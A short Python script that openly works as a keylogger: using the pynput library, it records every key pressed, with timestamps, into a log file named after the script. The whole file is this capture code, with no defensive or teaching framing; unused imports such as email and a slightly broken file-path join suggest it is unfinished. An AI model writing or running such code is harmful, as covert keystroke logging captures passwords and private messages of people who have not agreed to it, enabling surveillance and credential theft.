import email
from fileinput import filename
import pynput
from pynput.keyboard import Key, Listener
import logging
import os

# These Section of the code will create the txt file in scripts folder and write every keyboard input with datetime format into the txt file
file_path = os.path.realpath(__file__)
logging.basicConfig(filename = (file_path + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    
def on_press(key):
    logging.info(str(key))
    
with Listener(on_press=on_press) as listener:
    listener.join()
